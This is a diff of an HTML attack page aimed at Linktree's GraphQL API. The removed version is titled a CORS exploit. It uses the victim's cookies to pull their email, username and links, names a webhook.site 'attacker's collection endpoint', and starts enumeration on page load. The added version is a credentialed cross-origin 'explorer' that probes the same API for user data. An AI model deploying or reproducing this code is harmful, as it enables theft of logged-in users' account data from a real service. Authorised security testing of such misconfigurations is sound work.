@@ -2,116 +2,124 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Linktree CORS Exploit - Data Exfiltration</title>
+  <title>Linktree GraphQL Explorer</title>
   <style>
     body { 
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
       background: #0d1117; 
       color: #c9d1d9; 
-      padding: 40px; 
-      text-align: center; 
+      padding: 20px; 
     }
     .container { 
       background: #161b22; 
       border: 1px solid #30363d; 
-      border-radius: 12px; 
-      padding: 30px; 
-      display: inline-block; 
-      min-width: 600px; 
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
-    }
-    h1 { 
-      color: #ff4d4d; 
-      font-size: 24px; 
-    }
-    button { 
-      background-color: #ff3333; 
-      color: white; 
-      border: none; 
-      padding: 15px 30px; 
-      font-size: 16px; 
-      font-weight: bold; 
-      border-radius: 6px; 
-      cursor: pointer; 
-      transition: 0.2s; 
+      border-radius: 8px; 
+      padding: 20px; 
       margin: 10px;
     }
+    button { 
+      background-color: #238636; 
+      color: white; 
+      border: none; 
+      padding: 10px 15px; 
+      margin: 5px;
+      border-radius: 4px; 
+      cursor: pointer; 
+    }
     button:hover { 
-      background-color: #cc0000; 
+      background-color: #2ea043; 
     }
     #output { 
-      margin-top: 25px; 
-      text-align: left; 
       background: #0d1117; 
-      padding: 20px; 
-      border-radius: 6px; 
+      padding: 15px; 
+      border-radius: 4px; 
       border: 1px solid #30363d; 
       color: #7ee787; 
-      white-space: pre-wrap; 
       font-family: monospace; 
-      overflow-x: auto; 
+      white-space: pre-wrap; 
       max-height: 400px; 
-    }
-    .warning {
-      color: #ff9900;
-      font-weight: bold;
+      overflow-y: auto;
     }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <h1>🚨 Linktree CORS Misconfiguration Exploit</h1>
-  <p><strong>Target:</strong> graph.linktr.ee/graphql</p>
-  <p class="warning">⚠️ This exploit demonstrates data exfiltration capabilities</p>
-  
-  <button onclick="enumerateSchema()">ENUMERATE SCHEMA</button>
-  <button onclick="fetchUserData()">FETCH USER DATA</button>
-  <button onclick="fetchAllLinks()">FETCH ALL LINKS</button>
-  <button onclick="exfiltrateData()">EXFILTRATE TO ATTACKER</button>
-
-  <div id="output">Status: Ready. Ensure you're logged into Linktree.</div>
+  <h2>🔍 GraphQL Schema Discovery</h2>
+  <button onclick="discoverRootFields()">Discover Root Fields</button>
+  <button onclick="tryCommonQueries()">Try Common Queries</button>
+  <button onclick="findUserQueries()">Find User Queries</button>
+  <div id="output">Ready to explore...</div>
 </div>
 
 <script>
-  // Attacker's collection endpoint
-  const EXFIL_ENDPOINT = 'https://webhook.site/1d5db2f5-c1f2-4771-822b-93efc4b2d178';
-
-  async function sendGraphQLQuery(query) {
+  async function sendQuery(query) {
     const url = `https://graph.linktr.ee/graphql?query=${encodeURIComponent(query)}`;
     try {
-      const res = await fetch(url, {
+      const response = await fetch(url, {
         method: 'GET',
         credentials: 'include'
       });
-      return await res.json();
-    } catch (err) {
-      console.error(err);
-      return { error: err.message };
+      return await response.json();
+    } catch (error) {
+      return { error: error.toString() };
     }
   }
 
-  async function enumerateSchema() {
-    const out = document.getElementById("output");
-    out.innerHTML = "[*] Enumerating GraphQL schema...";
-
+  async function discoverRootFields() {
+    const output = document.getElementById('output');
+    output.innerHTML = 'Discovering root fields...\n';
+    
+    // Simple query to get top-level fields
     const query = `
+      query {
+        __schema {
+          queryType {
+            fields {
+              name
+              description
+            }
+          }
+        }
+      }
+    `;
+    
+    const result = await sendQuery(query);
+    output.innerHTML = JSON.stringify(result, null, 2);
+  }
+
+  async function tryCommonQueries() {
+    const output = document.getElementById('output');
+    output.innerHTML = 'Trying common query patterns...\n';
+    
+    const commonQueries = [
+      'query { __typename }',
+      'query { me { __typename } }',
+      'query { user { __typename } }',
+      'query { currentUser { __typename } }',
+      'query { profile { __typename } }',
+      'query { account { __typename } }'
+    ];
+    
+    for (let query of commonQueries) {
+      output.innerHTML += `\nTrying: ${query}\n`;
+      const result = await sendQuery(query);
+      output.innerHTML += JSON.stringify(result, null, 2) + '\n---\n';
+      await new Promise(resolve => setTimeout(resolve, 500)); // Small delay
+    }
+  }
+
+  async function findUserQueries() {
+    const output = document.getElementById('output');
+    output.innerHTML = 'Searching for user-related queries...\n';
+    
+    // Try to get the full schema
+    const introspectionQuery = `
       query IntrospectionQuery {
         __schema {
           types {
             name
-            fields {
-              name
-            }
-          }
-          queryType {
-            name
-            fields {
-              name
-            }
-          }
-          mutationType {
-            name
+            kind
             fields {
               name
             }
@@ -119,139 +127,35 @@
         }
       }
     `;
-
-    const result = await sendGraphQLQuery(query);
     
-    if (result?.data?.__schema) {
-      out.innerHTML = `<span style='color:#7ee787;'>✅ SCHEMA ENUMERATION SUCCESSFUL!</span>\n\nFound ${result.data.__schema.types.length} types.\n\nSample types: ${result.data.__schema.types.slice(0, 10).map(t => t.name).join(', ')}`;
+    const result = await sendQuery(introspectionQuery);
+    
+    if (result.data && result.data.__schema) {
+      // Look for types that might contain user data
+      const types = result.data.__schema.types;
+      const userTypes = types.filter(type => 
+        type && type.name && (
+          type.name.toLowerCase().includes('user') ||
+          type.name.toLowerCase().includes('profile') ||
+          type.name.toLowerCase().includes('account')
+        )
+      );
       
-      // Log full schema to console for detailed analysis
-      console.log('Full Schema:', result.data.__schema);
+      output.innerHTML = `Found potential user types:\n${JSON.stringify(userTypes.map(t => t.name), null, 2)}\n\n`;
+      
+      // Try querying these types
+      for (let type of userTypes) {
+        if (type.name) {
+          const testQuery = `query { ${type.name} { __typename } }`;
+          output.innerHTML += `\nTesting: ${testQuery}\n`;
+          const testResult = await sendQuery(testQuery);
+          output.innerHTML += JSON.stringify(testResult, null, 2) + '\n';
+        }
+      }
     } else {
-      out.innerHTML = `<span style='color:#ffa657;'>⚠️ Schema enumeration response:</span>\n${JSON.stringify(result, null, 2)}`;
+      output.innerHTML = 'Introspection failed: ' + JSON.stringify(result, null, 2);
     }
   }
-
-  async function fetchUserData() {
-    const out = document.getElementById("output");
-    out.innerHTML = "[*] Fetching user data...";
-
-    // Try multiple common user data queries
-    const queries = [
-      'query { viewer { id username email bio displayName profilePictureUrl createdAt updatedAt } }',
-      'query { me { id username email } }',
-      'query { currentUser { id email username } }',
-      'query { user { id email username } }'
-    ];
-
-    for (let query of queries) {
-      const result = await sendGraphQLQuery(query);
-      if (result?.data && !result.errors) {
-        out.innerHTML = `<span style='color:#7ee787;'>✅ USER DATA RETRIEVED!</span>\n\n${JSON.stringify(result.data, null, 2)}`;
-        return;
-      }
-    }
-    
-    out.innerHTML = `<span style='color:#ffa657;'>⚠️ No user data found with common queries</span>\nBut the endpoint is accessible!\n\nTrying link enumeration...`;
-    fetchAllLinks();
-  }
-
-  async function fetchAllLinks() {
-    const out = document.getElementById("output");
-    out.innerHTML = "[*] Fetching all user links...";
-
-    const query = `
-      query {
-        viewer {
-          links(first: 100) {
-            edges {
-              node {
-                id
-                url
-                type
-                title
-              }
-            }
-          }
-        }
-      }
-    `;
-
-    const result = await sendGraphQLQuery(query);
-    
-    if (result?.data?.viewer?.links) {
-      const linkCount = result.data.viewer.links.edges.length;
-      out.innerHTML = `<span style='color:#7ee787;'>✅ LINKS RETRIEVED! (${linkCount} links)</span>\n\nSample links:\n${result.data.viewer.links.edges.slice(0, 5).map(edge => `- ${edge.node.title}: ${edge.node.url}`).join('\n')}`;
-    } else {
-      out.innerHTML = `<span style='color:#ffa657;'>⚠️ Links query response:</span>\n${JSON.stringify(result, null, 2)}`;
-    }
-  }
-
-  async function exfiltrateData() {
-    const out = document.getElementById("output");
-    out.innerHTML = "[*] Exfiltrating data to attacker server...";
-
-    // Collect various pieces of information
-    const dataToSteal = {};
-
-    // Get basic user info
-    const userInfoQuery = 'query { viewer { id username email displayName } }';
-    const userInfo = await sendGraphQLQuery(userInfoQuery);
-    if (userInfo?.data?.viewer) {
-      dataToSteal.user = userInfo.data.viewer;
-    }
-
-    // Get links
-    const linksQuery = `
-      query {
-        viewer {
-          links(first: 50) {
-            edges {
-              node {
-                url
-                title
-              }
-            }
-          }
-        }
-      }
-    `;
-    const linksInfo = await sendGraphQLQuery(linksQuery);
-    if (linksInfo?.data?.viewer?.links) {
-      dataToSteal.links = linksInfo.data.viewer.links.edges.map(edge => edge.node);
-    }
-
-    // Send to attacker server (in real scenario)
-    try {
-      // This would normally send to your server
-      console.log('Exfiltrated data:', dataToSteal);
-      
-      // Simulate sending to attacker server
-      out.innerHTML = `<span style='color:#7ee787;'>✅ DATA EXFILTRATED SUCCESSFULLY!</span>\n\nCollected data includes:\n- User information\n- All user links (${dataToSteal.links?.length || 0} links)\n\nIn a real attack, this data would be sent to: ${EXFIL_ENDPOINT}`;
-      
-      // Show what would be sent
-      const stolenDataPreview = {
-        timestamp: new Date().toISOString(),
-        victim: dataToSteal.user || 'Unknown',
-        linkCount: dataToSteal.links?.length || 0,
-        sampleLinks: dataToSteal.links?.slice(0, 3) || []
-      };
-      
-      out.innerHTML += `\n\nSample of exfiltrated data:\n${JSON.stringify(stolenDataPreview, null, 2)}`;
-      
-    } catch (err) {
-      out.innerHTML = `<span style='color:#f85149;'>[-] Exfiltration failed:</span> ${err.message}`;
-    }
-  }
-
-  // Auto-run enumeration on page load to show immediate threat
-  window.addEventListener('load', function() {
-    setTimeout(() => {
-      document.getElementById("output").innerHTML = "🔄 Auto-detecting available data...";
-      enumerateSchema();
-    }, 2000);
-  });
 </script>
 </body>
 </html>
-
